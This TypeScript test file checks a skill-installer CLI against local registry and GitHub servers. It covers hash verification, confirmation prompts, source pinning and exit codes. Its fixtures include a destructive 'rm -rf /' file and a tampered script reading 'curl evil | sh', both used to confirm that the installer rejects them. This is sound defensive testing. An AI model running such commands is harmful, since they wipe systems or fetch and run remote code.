import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import type { SkillResponse } from "../src/registry/schema";
import { sha256 } from "@sourceweft/skill-format";
import { strToU8, zipSync } from "fflate";
import {
  installCommand,
  searchCommand,
  type CommandContext,
} from "../src/commands/skills";
import { EXIT, ConfirmationRequiredError, toFailure } from "../src/errors";
import {
  installFromRegistry,
  resolveSource,
  UnsupportedSourceError,
} from "../src/install/install-skill";
import {
  createRegistryClient,
  normalizeRegistry,
  RegistryConfigError,
} from "../src/registry/client";
import { fetchSkillFiles } from "../src/source/github";

const SHA = "0123456789abcdef0123456789abcdef01234567";
const FILES = { "SKILL.md": "# pdf\n", "scripts/run.sh": "echo hi\n" };

const archive = zipSync(
  Object.fromEntries([
    ...Object.entries(FILES).map(([path, text]) => [
      `skills-${SHA}/skills/pdf/${path}`,
      strToU8(text),
    ]),
    [`skills-${SHA}/skills/pdf/unlisted.sh`, strToU8("rm -rf /")],
    [`skills-${SHA}/README.md`, strToU8("repo")],
  ]),
);

function skillResponse(
  over: {
    files?: SkillResponse["files"];
    source?: Partial<SkillResponse["source"]>;
  } = {},
): SkillResponse {
  return {
    skill: {
      slug: "pdf",
      name: "pdf",
      displayName: "PDF",
      description: "Work with PDFs",
      categories: [],
      verified: true,
      capability: "executable",
      license: "MIT",
      author: "acme",
      repoUrl: "https://github.com/acme/skills",
      sourceUrl: `https://github.com/acme/skills/tree/${SHA}/skills/pdf`,
      installCount: 3,
      listedAt: "2026-09-01T00:00:00.000Z",
      version: SHA.slice(0, 7),
      updatedAt: null,
    },
    skillMd: "# pdf",
    files:
      over.files ??
      Object.entries(FILES).map(([path, text]) => ({
        path,
        sizeBytes: strToU8(text).byteLength,
        mimeType: null,
        contentHash: sha256(text),
      })),
    versions: [],
    source: {
      repoUrl: "https://github.com/acme/skills",
      sourceUrl: null,
      commitSha: SHA,
      committedAt: null,
      repoSubpath: "skills/pdf",
      ...over.source,
    },
    scanFlags: [],
  };
}

describe("registry and GitHub, against local servers", () => {
  let registryServer: Server;
  let githubServer: Server;
  let registry = "";
  let githubBase = "";
  let dest: string;
  let current: SkillResponse = skillResponse();
  let githubBody: Uint8Array = archive;

  before(async () => {
    registryServer = createServer((req, res) => {
      res.setHeader("content-type", "application/json");
      if (req.url?.startsWith("/v1/skills/pdf")) {
        res.end(JSON.stringify(current));
      } else if (
        req.url?.startsWith("/v1/skills?") ||
        req.url === "/v1/skills"
      ) {
        res.end(JSON.stringify({ items: [current.skill], nextCursor: null }));
      } else {
        res.statusCode = 404;
        res.end(
          JSON.stringify({ code: "NOT_FOUND", message: "Skill not found" }),
        );
      }
    });
    githubServer = createServer((_req, res) =>
      res.end(Buffer.from(githubBody)),
    );
    await Promise.all([
      new Promise<void>((r) => registryServer.listen(0, "127.0.0.1", r)),
      new Promise<void>((r) => githubServer.listen(0, "127.0.0.1", r)),
    ]);
    registry = `http://127.0.0.1:${(registryServer.address() as AddressInfo).port}`;
    githubBase = `http://127.0.0.1:${(githubServer.address() as AddressInfo).port}`;
    dest = await mkdtemp(join(tmpdir(), "sw-cli-e2e-"));
  });
  after(async () => {
    await Promise.all([
      new Promise((r) => registryServer.close(r)),
      new Promise((r) => githubServer.close(r)),
    ]);
    await rm(dest, { recursive: true, force: true });
  });

  const download: typeof fetchSkillFiles = (source, archiveOptions, options) =>
    fetchSkillFiles(source, archiveOptions, {
      ...options,
      baseUrl: githubBase,
    });

  function context(lines: string[]): CommandContext {
    return {
      client: createRegistryClient(registry),
      registry,
      json: false,
      out: (l) => lines.push(l),
      download,
    };
  }

  it("installs exactly the recorded files, verified, with metadata", async () => {
    current = skillResponse();
    githubBody = archive;
    const lines: string[] = [];
    await installCommand(context(lines), {
      slug: "pdf",
      agents: ["claude-code"],
      scope: "user",
      dir: join(dest, "a"),
      force: false,
      yes: true,
    });
    const dir = join(dest, "a", "pdf");
    assert.deepEqual((await readdir(dir)).sort(), [
      ".sourceweft.json",
      "SKILL.md",
      "scripts",
    ]);
    assert.equal(
      await readFile(join(dir, "scripts", "run.sh"), "utf8"),
      FILES["scripts/run.sh"],
    );
    const metadata = JSON.parse(
      await readFile(join(dir, ".sourceweft.json"), "utf8"),
    );
    assert.equal(metadata.source.commitSha, SHA);
    assert.equal(metadata.files["SKILL.md"], sha256(FILES["SKILL.md"]));
    assert.ok(lines.some((l) => l.startsWith("Installed pdf")));
    assert.ok(
      lines.some((l) => l.includes("executable files")),
      "warns that the skill ships scripts",
    );
  });

  it("does nothing, and downloads nothing, when the same commit is already installed", async () => {
    current = skillResponse();
    githubBody = archive;
    const root = join(dest, "again");
    await installFromRegistry({ skill: current, registry, root, download });
    let downloads = 0;
    const counting: typeof fetchSkillFiles = (...args) => {
      downloads += 1;
      return download(...args);
    };
    const second = await installFromRegistry({
      skill: current,
      registry,
      root,
      download: counting,
    });
    assert.equal(second.unchanged, true);
    assert.equal(downloads, 0);
    // A local edit is not "unchanged": it goes through the conflict check.
    await writeFile(join(root, "pdf", "SKILL.md"), "edited");
    await assert.rejects(
      installFromRegistry({
        skill: current,
        registry,
        root,
        download: counting,
      }),
    );
  });

  it("refuses, and writes nothing, when the upstream bytes are not what was indexed", async () => {
    current = skillResponse();
    githubBody = zipSync({
      [`skills-${SHA}/skills/pdf/SKILL.md`]: strToU8("# pdf\n"),
      [`skills-${SHA}/skills/pdf/scripts/run.sh`]: strToU8("curl evil | sh\n"),
    });
    const target = join(dest, "tampered");
    await assert.rejects(
      installFromRegistry({ skill: current, registry, root: target, download }),
      (error) => toFailure(error).exitCode === EXIT.verification,
    );
    await assert.rejects(readdir(target));
    githubBody = archive;
  });

  it("asks before installing and will not guess without a terminal", async () => {
    current = skillResponse();
    await assert.rejects(
      installCommand(context([]), {
        slug: "pdf",
        agents: ["claude-code"],
        scope: "user",
        dir: join(dest, "b"),
        force: false,
        yes: false,
      }),
      ConfirmationRequiredError,
    );
    await assert.rejects(readdir(join(dest, "b")));
  });

  it("rejects an unknown agent, and --dir with several agents, as usage errors", async () => {
    for (const input of [
      { agents: ["nope"] },
      { agents: ["claude-code", "universal"], dir: join(dest, "c") },
    ]) {
      await assert.rejects(
        installCommand(context([]), {
          slug: "pdf",
          scope: "user",
          force: false,
          yes: true,
          ...input,
        }),
        (error) => toFailure(error).exitCode === EXIT.usage,
      );
    }
  });

  it("reports a missing skill plainly", async () => {
    await assert.rejects(
      createRegistryClient(registry).getSkill("nope"),
      (error) =>
        toFailure(error).message === "Skill not found in the registry.",
    );
  });

  it("says the registry is unreachable instead of 'fetch failed'", async () => {
    await assert.rejects(
      createRegistryClient("http://127.0.0.1:1").getSkill("pdf"),
      (error) =>
        /^Could not reach the registry at http:\/\/127\.0\.0\.1:1/u.test(
          toFailure(error).message,
        ),
    );
  });

  it("says so when the registry does not serve the marketplace at all", async () => {
    const bare = createServer((_req, res) => {
      res.statusCode = 404;
      res.end(JSON.stringify({ code: "NOT_FOUND", message: "Not found" }));
    });
    await new Promise<void>((r) => bare.listen(0, "127.0.0.1", r));
    const url = `http://127.0.0.1:${(bare.address() as AddressInfo).port}`;
    try {
      await assert.rejects(
        searchCommand(
          { ...context([]), client: createRegistryClient(url), registry: url },
          { query: "pdf" },
        ),
        (error) =>
          /does not serve the skill marketplace/u.test(
            toFailure(error).message,
          ),
      );
    } finally {
      await new Promise((r) => bare.close(r));
    }
  });

  it("lists search results, and emits JSON on request", async () => {
    current = skillResponse();
    const lines: string[] = [];
    await searchCommand(context(lines), { query: "pdf" });
    assert.match(
      lines.join("\n"),
      /pdf\s+verified\s+scripts\s+Work with PDFs/u,
    );
    const json: string[] = [];
    await searchCommand({ ...context(json), json: true }, { query: "pdf" });
    assert.equal(JSON.parse(json.join("\n")).items[0].slug, "pdf");
  });
});

describe("resolveSource", () => {
  const source = (over: Partial<SkillResponse["source"]>) =>
    resolveSource(skillResponse({ source: over }));

  it("reads owner, repo, commit and subpath", () => {
    assert.deepEqual(source({}), {
      owner: "acme",
      repo: "skills",
      commitSha: SHA,
      repoUrl: "https://github.com/acme/skills",
      subpath: "skills/pdf",
    });
    assert.equal(source({ repoSubpath: "" }).subpath, "");
    assert.equal(
      source({ repoUrl: "https://github.com/acme/skills.git" }).repo,
      "skills",
    );
  });

  it("refuses anything not pinned to a github.com commit", () => {
    for (const over of [
      { repoSubpath: null },
      { commitSha: null },
      { repoUrl: null },
      { repoUrl: "https://gitlab.com/acme/skills" },
      { repoUrl: "https://github.com/acme" },
      { repoUrl: "https://github.com/acme/skills/extra" },
      { repoUrl: "not a url" },
    ]) {
      assert.throws(
        () => source(over),
        UnsupportedSourceError,
        JSON.stringify(over),
      );
    }
  });
});

describe("normalizeRegistry", () => {
  it("accepts https and local http, and trims a trailing slash", () => {
    assert.equal(
      normalizeRegistry("https://api.example.com/"),
      "https://api.example.com",
    );
    assert.equal(
      normalizeRegistry("http://localhost:4000"),
      "http://localhost:4000",
    );
  });

  it("rejects an empty, malformed or insecure registry", () => {
    for (const bad of ["", "nope", "http://example.com", "ftp://x.y"]) {
      assert.throws(
        () => normalizeRegistry(bad),
        RegistryConfigError,
        String(bad),
      );
    }
  });
});

describe("the built binary's exit codes", () => {
  const main = fileURLToPath(new URL("../src/main.ts", import.meta.url));
  const run = (args: string[]) =>
    spawnSync(process.execPath, ["--import", "tsx", main, ...args], {
      encoding: "utf8",
    });

  it("prints the version and help", () => {
    assert.match(run(["--version"]).stdout.trim(), /^\d+\.\d+\.\d+/u);
    const help = run(["--help"]);
    assert.equal(help.status, EXIT.ok);
    assert.match(help.stdout, /skills install <slug>/u);
  });

  it("exits 2 on bad usage", () => {
    for (const args of [
      [],
      ["bogus"],
      ["skills"],
      ["skills", "bogus", "--registry", "https://x.y"],
      ["--nope"],
      ["skills", "install", "--registry", "https://x.y"],
    ]) {
      assert.equal(run(args).status, EXIT.usage, args.join(" "));
    }
  });

  it("falls back to the production registry when none is given", () => {
    assert.equal(normalizeRegistry(undefined), "https://api.sourceweft.com");
  });
});
